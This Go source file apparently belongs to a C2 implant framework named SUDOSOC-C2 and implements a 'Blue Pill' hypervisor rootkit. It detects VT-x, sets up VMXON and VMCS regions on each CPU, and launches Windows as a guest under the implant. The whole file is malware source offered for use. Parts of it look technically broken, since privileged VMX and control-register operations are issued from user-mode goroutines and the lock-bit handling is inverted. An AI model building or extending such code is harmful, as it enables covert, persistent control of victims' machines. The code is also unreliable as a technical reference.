package hypervisor

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	VMX main orchestration — detects, initialises, and launches the hypervisor.

	Blue Pill execution flow:
	  1. Detect Intel VT-x (CPUID) and check IA32_FEATURE_CONTROL lock bit.
	  2. Allocate VMXON region (4K, per-PCPU) and VMCS (4K, per-VCPU).
	  3. Enable CR4.VMXE, execute VMXON → enter VMX root operation.
	  4. VMCLEAR + VMPTRLD to make our VMCS current.
	  5. Write guest state (copy of current CPU state), host state
	     (our hypervisor state), and execution controls into the VMCS.
	  6. VMLAUNCH → CPU enters VMX non-root, Windows becomes the guest.
	  7. VMLAUNCH returns only on failure; on success the hypervisor runs
	     forever in the VM-exit handler loop.

	Per-CPU considerations:
	  On SMP systems each logical CPU must be independently virtualised.
	  We use SetThreadAffinityMask to pin our init goroutine to each CPU
	  in turn and run steps 1–6 on each. All CPUs must be virtualised
	  before any exits are expected, otherwise an un-virtualised CPU that
	  receives a cross-CPU IPI will crash.

	Memory requirements:
	  - 1 VMXON region per CPU (4 KB)
	  - 1 VMCS per CPU (4 KB)
	  - EPT page tables (~2 MB for a 64 GB identity map)
	  - Host stack per CPU (64 KB recommended)
	  - MSR bitmap (4 KB, shared)
	  Total: ~4–8 MB for a typical 4-core system.
*/

import (
	"fmt"
	"runtime"
	"sync"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

const (
	VmxonRegionSize = 4096
	VmcsRegionSize  = 4096
	HostStackSize   = 64 * 1024 // 64 KB host stack per CPU
	MaxCpus         = 256
)

// VcpuState holds the per-CPU VMX structures.
type VcpuState struct {
	CPU        int
	VmxonPhys  uint64
	VmcsPhys   uint64
	HostStack  []byte
	VmxonRegion []byte // locked allocation
	VmcsRegion  []byte
}

// HypervisorState is the global singleton once the hypervisor is active.
type HypervisorState struct {
	NumCPUs int
	VCPUs   []*VcpuState
	Ept     *EptTables
	mu      sync.Mutex
}

var globalHV *HypervisorState

// IsActive returns true if the hypervisor has been launched.
func IsActive() bool { return globalHV != nil }

// Launch virtualises the current machine. After this call returns,
// Windows is running inside our hypervisor. The call returns nil on
// success — the hypervisor runs in VM-exit handlers, not a goroutine.
func Launch() error {
	if globalHV != nil {
		return fmt.Errorf("hypervisor already active")
	}

	numCPU := runtime.NumCPU()
	if numCPU > MaxCpus {
		numCPU = MaxCpus
	}

	// Build EPT identity map (64 GB covers any reasonable target).
	ept, err := BuildIdentityEPT(64)
	if err != nil {
		return fmt.Errorf("EPT: %w", err)
	}

	hv := &HypervisorState{
		NumCPUs: numCPU,
		VCPUs:   make([]*VcpuState, numCPU),
		Ept:     ept,
	}

	// Virtualise each CPU.
	var wg sync.WaitGroup
	errCh := make(chan error, numCPU)

	for i := 0; i < numCPU; i++ {
		wg.Add(1)
		go func(cpuIdx int) {
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			// Pin to this CPU.
			if err := setAffinityMask(1 << uint(cpuIdx)); err != nil {
				errCh <- fmt.Errorf("CPU %d affinity: %w", cpuIdx, err)
				return
			}

			vcpu, err := initialiseCPU(cpuIdx, ept)
			if err != nil {
				errCh <- fmt.Errorf("CPU %d init: %w", cpuIdx, err)
				return
			}
			hv.VCPUs[cpuIdx] = vcpu
		}(i)
	}
	wg.Wait()
	close(errCh)

	for err := range errCh {
		if err != nil {
			return err
		}
	}

	globalHV = hv
	// {{if .Config.Debug}}
	log.Printf("[hypervisor] active — %d VCPUs virtualised", numCPU)
	// {{end}}
	return nil
}

// Shutdown exits VMX operation on all CPUs. The OS returns to running on
// bare metal. Call this before process exit to avoid a BSOD.
func Shutdown() {
	if globalHV == nil {
		return
	}
	var wg sync.WaitGroup
	for i := 0; i < globalHV.NumCPUs; i++ {
		wg.Add(1)
		go func(cpuIdx int) {
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()
			setAffinityMask(1 << uint(cpuIdx))
			vmxoff()
		}(i)
	}
	wg.Wait()
	globalHV = nil
}

// ─── Per-CPU initialisation ───────────────────────────────────────────────

func initialiseCPU(cpuIdx int, ept *EptTables) (*VcpuState, error) {
	if !checkVTx() {
		return nil, fmt.Errorf("VT-x not available on CPU %d", cpuIdx)
	}

	vcpu := &VcpuState{CPU: cpuIdx}

	// Allocate and lock VMXON region.
	vmxonRegion, vmxonPhys, err := allocLockedPage(VmxonRegionSize)
	if err != nil {
		return nil, fmt.Errorf("VMXON alloc: %w", err)
	}
	vcpu.VmxonRegion = vmxonRegion
	vcpu.VmxonPhys = vmxonPhys

	// Write VMCS revision identifier into VMXON region[0:4].
	revID := uint32(rdmsr(MsrIa32VmxBasic) & 0x7FFFFFFF)
	*(*uint32)(unsafe.Pointer(&vmxonRegion[0])) = revID

	// Allocate VMCS.
	vmcsRegion, vmcsPhys, err := allocLockedPage(VmcsRegionSize)
	if err != nil {
		return nil, fmt.Errorf("VMCS alloc: %w", err)
	}
	vcpu.VmcsRegion = vmcsRegion
	vcpu.VmcsPhys = vmcsPhys
	*(*uint32)(unsafe.Pointer(&vmcsRegion[0])) = revID

	// Allocate host stack.
	vcpu.HostStack = make([]byte, HostStackSize)

	// Set CR4.VMXE (bit 13).
	cr4 := getCR4()
	setCR4(cr4 | (1 << 13))

	// Adjust CR0 / CR4 for VMX constraints.
	cr0 := getCR0()
	cr0fixed0 := rdmsr(MsrIa32VmxCr0Fixed0)
	cr0fixed1 := rdmsr(MsrIa32VmxCr0Fixed1)
	cr0 = (cr0 | cr0fixed0) & cr0fixed1
	setCR0(cr0)

	cr4fixed0 := rdmsr(MsrIa32VmxCr4Fixed0)
	cr4fixed1 := rdmsr(MsrIa32VmxCr4Fixed1)
	cr4 = getCR4()
	cr4 = (cr4 | cr4fixed0) & cr4fixed1
	setCR4(cr4)

	// Enter VMX root operation.
	if vmxon(vmxonPhys) != 0 {
		return nil, fmt.Errorf("VMXON failed on CPU %d", cpuIdx)
	}

	// Clear + load VMCS.
	if vmclear(vmcsPhys) != 0 || vmptrld(vmcsPhys) != 0 {
		vmxoff()
		return nil, fmt.Errorf("VMCLEAR/VMPTRLD failed on CPU %d", cpuIdx)
	}

	// Write VMCS fields.
	if err := writeVMCS(vcpu, ept); err != nil {
		vmxoff()
		return nil, fmt.Errorf("VMCS write: %w", err)
	}

	// Launch. If VMLAUNCH succeeds, this goroutine disappears into the guest
	// and the guest OS continues from the exact same instruction pointer.
	// If VMLAUNCH fails, it returns non-zero and we surface the error.
	if vmlaunch() != 0 {
		errCode, _ := vmread(0x4400) // VM_INSTRUCTION_ERROR
		vmxoff()
		return nil, fmt.Errorf("VMLAUNCH failed: error=%d", errCode)
	}

	// Not reached on success.
	return vcpu, nil
}

// writeVMCS populates the VMCS with guest state (current CPU), host state
// (our hypervisor), and VM execution controls.
func writeVMCS(vcpu *VcpuState, ept *EptTables) error {
	// ── Control Fields ────────────────────────────────────────────────────

	// Pin-based: intercept external interrupts and NMIs.
	pinBased := adjustControls(
		PinBasedExtIntExiting|PinBasedNmiExiting,
		MsrIa32VmxPinbasedCtls,
	)
	vmwrite(VmcsPinBasedVmExecControl, uint64(pinBased))

	// Primary CPU-based: use MSR bitmaps (allow most MSRs passthrough),
	// activate secondary controls.
	cpuBased := adjustControls(
		CpuBasedUseMsrBitmaps|CpuBasedActivateSecondaryControls,
		MsrIa32VmxProcbasedCtls,
	)
	vmwrite(VmcsCpuBasedVmExecControl, uint64(cpuBased))

	// Secondary: enable EPT and VPID.
	secondary := adjustControls(
		SecondaryExecEnableEpt|SecondaryExecEnableVpid|SecondaryExecEnableRdtscp,
		MsrIa32VmxProcbasedCtls2,
	)
	vmwrite(VmcsSecondaryVmExecControl, uint64(secondary))

	// EPT pointer.
	vmwrite(VmcsEptPointer, uint64(ept.EptPointerValue()))

	// VPID = 1 (non-zero to enable per-VCPU TLB tagging).
	vmwrite(VmcsVpid, 1)

	// VM-exit: 64-bit host, save/load EFER.
	exitCtls := adjustControls(
		VmExitHostAddrSpaceSize|VmExitSaveIa32Efer|VmExitLoadIa32Efer,
		MsrIa32VmxExitCtls,
	)
	vmwrite(VmcsVmExitControls, uint64(exitCtls))

	// VM-entry: 64-bit guest, load EFER.
	entryCtls := adjustControls(
		VmEntryIa32eModeGuest|VmEntryLoadIa32Efer,
		MsrIa32VmxEntryCtls,
	)
	vmwrite(VmcsVmEntryControls, uint64(entryCtls))

	// VMCS link pointer = 0xFFFFFFFFFFFFFFFF (not using VMCS shadowing).
	vmwrite(VmcsVmcsLinkPtr, ^uint64(0))

	// ── Guest State — copy from current CPU ──────────────────────────────

	// Segment registers.
	gdtrBase, gdtrLimit := getGDTR()
	idtrBase, idtrLimit := getIDTR()

	csSelector := getCS()
	ssSelector := getSS()
	dsSelector := getDS()
	esSelector := getES()
	fsSelector := getFS()
	gsSelector := getGS()
	trSelector := getTR()
	ldtrSelector := getLDTR()

	vmwrite(VmcsGuestCsSelector, uint64(csSelector))
	vmwrite(VmcsGuestSsSelector, uint64(ssSelector))
	vmwrite(VmcsGuestDsSelector, uint64(dsSelector))
	vmwrite(VmcsGuestEsSelector, uint64(esSelector))
	vmwrite(VmcsGuestFsSelector, uint64(fsSelector))
	vmwrite(VmcsGuestGsSelector, uint64(gsSelector))
	vmwrite(VmcsGuestTrSelector, uint64(trSelector))
	vmwrite(VmcsGuestLdtrSelector, uint64(ldtrSelector))

	// Segment bases.
	vmwrite(VmcsGuestCsBase, 0)
	vmwrite(VmcsGuestSsBase, 0)
	vmwrite(VmcsGuestDsBase, 0)
	vmwrite(VmcsGuestEsBase, 0)
	vmwrite(VmcsGuestFsBase, uint64(rdmsr(MsrIa32FsBase)))
	vmwrite(VmcsGuestGsBase, uint64(rdmsr(MsrIa32GsBase)))
	vmwrite(VmcsGuestGdtrBase, uint64(gdtrBase))
	vmwrite(VmcsGuestIdtrBase, uint64(idtrBase))

	// Segment limits.
	vmwrite(VmcsGuestCsLimit, 0xFFFFFFFF)
	vmwrite(VmcsGuestSsLimit, 0xFFFFFFFF)
	vmwrite(VmcsGuestDsLimit, 0xFFFFFFFF)
	vmwrite(VmcsGuestEsLimit, 0xFFFFFFFF)
	vmwrite(VmcsGuestFsLimit, 0xFFFFFFFF)
	vmwrite(VmcsGuestGsLimit, 0xFFFFFFFF)
	vmwrite(VmcsGuestGdtrLimit, uint64(gdtrLimit))
	vmwrite(VmcsGuestIdtrLimit, uint64(idtrLimit))

	// Segment access rights.
	vmwrite(VmcsGuestCsAccessRights, uint64(GuestCodeSegmentAR()))
	vmwrite(VmcsGuestSsAccessRights, uint64(GuestDataSegmentAR()))
	vmwrite(VmcsGuestDsAccessRights, uint64(GuestDataSegmentAR()))
	vmwrite(VmcsGuestEsAccessRights, uint64(GuestDataSegmentAR()))
	vmwrite(VmcsGuestFsAccessRights, uint64(GuestDataSegmentAR()))
	vmwrite(VmcsGuestGsAccessRights, uint64(GuestDataSegmentAR()))
	vmwrite(VmcsGuestTrAccessRights, uint64(GuestTSSAR()))
	vmwrite(VmcsGuestLdtrAccessRights, uint64(UnusableSegmentAR()))

	// Control registers.
	vmwrite(VmcsGuestCr0, getCR0())
	vmwrite(VmcsGuestCr3, getCR3())
	vmwrite(VmcsGuestCr4, getCR4())
	vmwrite(VmcsCr0GuestHostMask, 0)
	vmwrite(VmcsCr4GuestHostMask, 0)

	// RFLAGS (read at time of VMLAUNCH; guest will resume with current flags).
	vmwrite(VmcsGuestRflags, getRFLAGS())

	// Guest RIP and RSP will be set by VMLAUNCH to the instruction that
	// called us. We need to set them to the return address from this function
	// so the guest resumes exactly where it left off. The assembly trampoline
	// captures the correct values — here we write placeholder zeros; the
	// actual values are fixed up by the launch stub in the .s file.
	vmwrite(VmcsGuestRip, 0) // fixed by launch stub
	vmwrite(VmcsGuestRsp, 0) // fixed by launch stub

	// MSRs in guest VMCS.
	vmwrite(VmcsGuestIa32Efer, uint64(rdmsr(MsrIa32Efer)))
	vmwrite(VmcsGuestIa32Debugctl, 0)
	vmwrite(VmcsGuestIa32Pat, uint64(rdmsr(MsrIa32Pat)))
	vmwrite(VmcsGuestSysenterCs, uint64(rdmsr(MsrIa32SysenterCs)))
	vmwrite(VmcsGuestSysenterEsp, uint64(rdmsr(MsrIa32SysenterEsp)))
	vmwrite(VmcsGuestSysenterEip, uint64(rdmsr(MsrIa32SysenterEip)))

	vmwrite(VmcsGuestActivityState, 0) // active
	vmwrite(VmcsGuestInterruptibililty, 0)

	// ── Host State — our hypervisor ───────────────────────────────────────

	vmwrite(VmcsHostCsSelector, uint64(csSelector)&^uint64(3)) // host Ring 0
	vmwrite(VmcsHostSsSelector, uint64(ssSelector)&^uint64(3))
	vmwrite(VmcsHostDsSelector, uint64(dsSelector)&^uint64(3))
	vmwrite(VmcsHostEsSelector, uint64(esSelector)&^uint64(3))
	vmwrite(VmcsHostFsSelector, uint64(fsSelector)&^uint64(3))
	vmwrite(VmcsHostGsSelector, uint64(gsSelector)&^uint64(3))
	vmwrite(VmcsHostTrSelector, uint64(trSelector)&^uint64(3))

	vmwrite(VmcsHostCr0, getCR0())
	vmwrite(VmcsHostCr3, getCR3())
	vmwrite(VmcsHostCr4, getCR4())

	vmwrite(VmcsHostFsBase, uint64(rdmsr(MsrIa32FsBase)))
	vmwrite(VmcsHostGsBase, uint64(rdmsr(MsrIa32GsBase)))
	vmwrite(VmcsHostGdtrBase, uint64(gdtrBase))
	vmwrite(VmcsHostIdtrBase, uint64(idtrBase))
	vmwrite(VmcsHostIa32Efer, uint64(rdmsr(MsrIa32Efer)))
	vmwrite(VmcsHostIa32SysenterCs, uint64(rdmsr(MsrIa32SysenterCs)))
	vmwrite(VmcsHostIa32SysenterEsp, uint64(rdmsr(MsrIa32SysenterEsp)))
	vmwrite(VmcsHostIa32SysenterEip, uint64(rdmsr(MsrIa32SysenterEip)))

	// Host stack: top of our allocated host stack (stack grows down).
	hostStackTop := uintptr(unsafe.Pointer(&vcpu.HostStack[HostStackSize-8]))
	hostStackTop &^= 15 // 16-byte align
	vmwrite(VmcsHostRsp, uint64(hostStackTop))

	// Host RIP: our VM-exit trampoline.
	vmwrite(VmcsHostRip, uint64(vmExitTrampolineAddr()))

	return nil
}

// vmExitTrampolineAddr returns the address of the vmExitTrampoline function
// defined in the .s file.
func vmExitTrampolineAddr() uintptr {
	// In Go, taking the address of a function requires an indirect reference.
	fn := vmExitTrampoline
	return **(**uintptr)(unsafe.Pointer(&fn))
}

// ─── Helpers ──────────────────────────────────────────────────────────────

// checkVTx verifies that VT-x is available and enabled.
func checkVTx() bool {
	// CPUID leaf 1 ECX bit 5 = VMX support.
	_, _, ecx, _ := cpuid(1, 0)
	if ecx&(1<<5) == 0 {
		return false
	}
	// IA32_FEATURE_CONTROL must have VMX-outside-SMX enabled (bit 2) and
	// the lock bit set (bit 0).
	fc := rdmsr(MsrIa32FeatureControl)
	if fc&1 == 0 {
		// Unlock and enable.
		wrmsr(MsrIa32FeatureControl, fc|(1<<2)|(1<<0))
	} else if fc&(1<<2) == 0 {
		return false // BIOS disabled VMX
	}
	return true
}

// adjustControls takes desired control bits and adjusts them using the
// allowed-0 (low 32 bits of MSR) and allowed-1 (high 32 bits) masks.
func adjustControls(desired uint32, msr uint32) uint32 {
	cap := rdmsr(msr)
	allowed0 := uint32(cap)          // bits that must be 1
	allowed1 := uint32(cap >> 32)    // bits that may be 1
	return (desired | allowed0) & allowed1
}

// allocLockedPage allocates size bytes (must be multiple of 4K), zeros them,
// locks them in physical memory, and returns (virtual, physical).
func allocLockedPage(size uintptr) ([]byte, uint64, error) {
	addr, err := windows.VirtualAlloc(0, size,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)
	if err != nil {
		return nil, 0, err
	}
	if err := windows.VirtualLock(addr, size); err != nil {
		windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
		return nil, 0, err
	}
	buf := unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
	for i := range buf {
		buf[i] = 0
	}
	phys, err := getPhysicalAddress(addr)
	if err != nil {
		windows.VirtualUnlock(addr, size)
		windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
		return nil, 0, err
	}
	return buf, phys, nil
}

// setAffinityMask pins the current goroutine's OS thread to the given CPUs.
var (
	modK32Affinity        = windows.NewLazySystemDLL("kernel32.dll")
	procSetThreadAffinity = modK32Affinity.NewProc("SetThreadAffinityMask")
)

func setAffinityMask(mask uintptr) error {
	r, _, err := procSetThreadAffinity.Call(
		uintptr(windows.CurrentThread()), mask)
	if r == 0 {
		return fmt.Errorf("SetThreadAffinityMask: %w", err)
	}
	return nil
}
